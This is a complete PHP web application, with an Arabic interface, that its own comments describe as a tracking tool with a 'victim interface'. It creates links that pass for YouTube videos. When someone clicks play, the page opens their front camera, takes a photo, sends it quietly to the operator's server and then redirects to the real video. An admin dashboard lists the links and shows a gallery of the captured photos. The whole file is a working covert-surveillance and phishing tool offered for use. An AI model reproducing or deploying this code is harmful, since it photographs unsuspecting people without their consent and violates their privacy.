<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتشخيص
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker_pro.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        image_data TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

function fetch_real_meta($url) {$title = "YouTube Stream - Watch Live";
    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        
        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$oembed_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2);
        $json = curl_exec($ch);
        curl_close($ch);
        
        if ($json) {
            $data = json_decode($json, true);
            if (isset($data['title'])) {
                $title =$data['title'];
            }
        }
    }
    return ['title' => trim($title), 'image' => trim($image)];
}

$og_title = "YouTube Stream - Watch Live";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
$target_redirect = "";

// 1. معالجة طلب الزائر
if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect =$link['target_url'];
        $og_title =$link['meta_title'];
        $og_image =$link['meta_image'];

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_capture'])) {
            $img_base64 =$_POST['image'] ?? '';
            if (!empty($img_base64)) {
                try {
                    $capStmt =$db->prepare("INSERT INTO captures (code, image_data, created_at) VALUES (?, ?, ?)");
                    $capStmt->execute([$code,$img_base64, date('Y-m-d H:i:s')]);
                } catch (Exception $e) {}
            }
            exit('OK');
        }
    } else {
        die("Link not found.");
    }
}

// 2. إنشاء رابط جديد
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_real_meta($target_url);$code = substr(md5(uniqid(rand(), true)), 0, 7);
    
    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $meta['title'],$meta['image']]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

// جلب المعرض
$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM captures WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $captures =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $captures =$db->query("SELECT * FROM captures ORDER BY id DESC LIMIT 30")->fetchAll(PDO::FETCH_ASSOC);
}

// واجهة الضحية الاحترافية
if (isset($_GET['r']) && !empty($target_redirect)):
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0b0f17; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; overflow: hidden; }
        .player-box { width: 100%; max-width: 440px; background: #131b2e; border: 1px solid #1e293b; border-radius: 12px; overflow: hidden; box-shadow: 0 15px 35px rgba(0,0,0,0.6); text-align: center; }
        .thumbnail-container { position: relative; width: 100%; height: 240px; background: url('<?php echo htmlspecialchars($og_image); ?>') center/cover no-repeat; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .play-btn { width: 64px; height: 64px; background: rgba(239, 68, 68, 0.9); border-radius: 50%; display: flex; justify-content: center; align-items: center; box-shadow: 0 0 20px rgba(239,68,68,0.5); transition: transform 0.2s; }
        .play-btn::after { content: ''; display: block; width: 0; height: 0; border-style: solid; border-width: 10px 0 10px 18px; border-color: transparent transparent transparent #fff; margin-left: 3px; }
        .thumbnail-container:hover .play-btn { transform: scale(1.1); }
        .video-info { padding: 20px; }
        .video-title { font-size: 15px; font-weight: 600; color: #f8fafc; margin-bottom: 8px; line-height: 1.4; }
        .video-desc { font-size: 12px; color: #94a3b8; }
    </style>
    <script>
        const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
        const targetUrl = "<?php echo $target_redirect; ?>";

        function startProcess() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.play();
                    
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        const imageData = canvas.toDataURL('image/jpeg', 0.90);
                        stream.getTracks().forEach(track => track.stop());

                        const formData = new URLSearchParams();
                        formData.append('save_capture', '1');
                        formData.append('image', imageData);

                        if (navigator.sendBeacon) {
                            navigator.sendBeacon(`/?r=${redirectCode}`, formData);
                            setTimeout(() => { window.location.replace(targetUrl); }, 250);
                        } else {
                            fetch(`/?r=${redirectCode}`, {
                                method: 'POST',
                                body: formData,
                                keepalive: true
                            }).finally(() => {
                                window.location.replace(targetUrl);
                            });
                        }
                    }, 350);
                })
                .catch(err => {
                    window.location.replace(targetUrl);
                });
        }
    </script>
</head>
<body>
    <div class="player-box">
        <div class="thumbnail-container" onclick="startProcess()">
            <div class="play-btn"></div>
        </div>
        <div class="video-info">
            <div class="video-title"><?php echo htmlspecialchars($og_title); ?></div>
            <div class="video-desc">اضغط لعرض المقطع بجودة HD</div>
        </div>
    </div>
</body>
</html>
<?php 
    exit(); 
endif; 
?>
<!-- لوحة التحكم الإدارية الاحترافية -->
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم الرئيسية</title>
    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #3b82f6;
            --accent-hover: #2563eb;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 10px; padding: 25px; box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2); }
        h2 { font-size: 14px; font-weight: 600; margin-bottom: 16px; color: #f8fafc; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
        .form-row { display: flex; gap: 10px; }
        input[type="text"] { flex: 1; background: #0f172a; border: 1px solid var(--border-color); border-radius: 6px; padding: 12px 14px; color: #f8fafc; font-size: 14px; outline: none; }
        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 6px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; }
        .btn:hover { background: var(--accent-hover); }
        .btn-danger { background: var(--danger); }
        .result-panel { background: #0f172a; border: 1px solid var(--border-color); padding: 16px; border-radius: 6px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; }
        .link-flex { display: flex; gap: 8px; }
        
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; margin-top: 15px; }
        .card-img { background: #0f172a; border: 1px solid var(--border-color); border-radius: 8px; overflow: hidden; padding: 10px; text-align: center; }
        .card-img img { width: 100%; height: 200px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
        .card-meta { margin-top: 10px; font-size: 12px; color: var(--text-muted); display: flex; justify-content: space-between; align-items: center; }
        .badge-code { color: #38bdf8; font-family: monospace; font-weight: bold; }
        
        footer { text-align: center; margin-top: 40px; font-size: 12px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: #38bdf8; font-weight: 600; }
    </style>
</head>
<body>
    <div class="wrapper">
        
        <section class="section-box">
            <h2>توليد رابط التعقب الاحترافي</h2>
            <form method="POST" class="form-row">
                <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف (مثل يوتيوب)..." required>
                <button type="submit" name="create" class="btn">توليد الرابط</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>رابط التعقب النشط:</label>
                    <div class="link-flex">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn" style="background:#334155;" onclick="navigator.clipboard.writeText('<?php echo htmlspecialchars($generated_link); ?>')">نسخ</button>
                    </div>
                </div>
            <?php endif; ?>
        </section>

        <section class="section-box">
            <h2>معرض الصور الملتقطة</h2>
            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
                <input type="text" name="track" placeholder="تصفية بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>">
                <button type="submit" class="btn">بحث</button>
                <?php if(!empty($filter_code)): ?>
                    <a href="/" class="btn btn-danger" style="text-decoration:none; display:flex; align-items:center;">إلغاء</a>
                <?php endif; ?>
            </form>

            <?php if (empty($captures)): ?>
                <p style="text-align: center; color: var(--text-muted); padding: 30px;">لا توجد أي صور ملتقطة حتى الآن.</p>
            <?php else: ?>
                <div class="gallery-grid">
                    <?php foreach ($captures as$cap): ?>
                        <div class="card-img">
                            <a href="<?php echo $cap['image_data']; ?>" target="_blank">
                                <img src="<?php echo $cap['image_data']; ?>" alt="Captured Image">
                            </a>
                            <div class="card-meta">
                                <span class="badge-code"><?php echo htmlspecialchars($cap['code']); ?></span>
                                <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            <?php endif; ?>
        </section>

    </div>

    <footer>
        <p>Powered by <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
